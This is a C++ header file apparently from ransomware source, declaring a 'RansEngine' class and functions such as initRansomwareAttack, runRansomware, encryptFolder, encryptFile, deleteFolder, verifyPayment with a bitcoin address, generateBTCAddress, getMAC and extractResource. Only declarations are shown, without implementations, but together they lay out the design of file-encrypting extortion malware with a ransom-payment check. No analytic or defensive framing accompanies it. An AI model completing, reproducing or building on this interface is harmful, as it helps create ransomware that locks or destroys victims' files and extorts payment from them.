#pragma once


class RansEngine
{
public:
	RansEngine();
	~RansEngine();
};

void hex2char(BYTE* in, int len, char* out);
void char2hex(char* in, int len, BYTE* out);

BOOL initRansomwareAttack();
BOOL runRansomware();

BOOL verifyPayment(char* btcAddress);

BOOL writeProfileWithEncrypt(char* appName, char* keyName, BYTE* value);
BOOL getProfileWithEncrypt(char* appName, char* keyName, BYTE* value);

char* getMAC();
void generateSessionKey(BYTE* sessionKey);

void generateBTCAddress(BYTE* pubKey, int keySize, CHAR* bitcoinAddr);

void encryptFolder(char* folderPath, BYTE* key);
void decryptFolder(char* folderPath, BYTE* key);
void deleteFolder(char* folderPath);

BOOL encryptFile(char* filePath, BYTE* key);
BOOL decryptFile(char* filePath, BYTE* key);

void encryptBuf(BYTE* buf, int bufSize, BYTE* outBuf, BYTE* key);
void decryptBuf(BYTE* buf, int bufSize, BYTE* outBuf, BYTE* key);

BOOL verifyPassword(BYTE* fileHash, BYTE* mainKey);

BOOL createAttackFolder(CHAR* targetFolder);
BOOL extractResource(CHAR* path, CHAR* resourceType, WORD resourceID);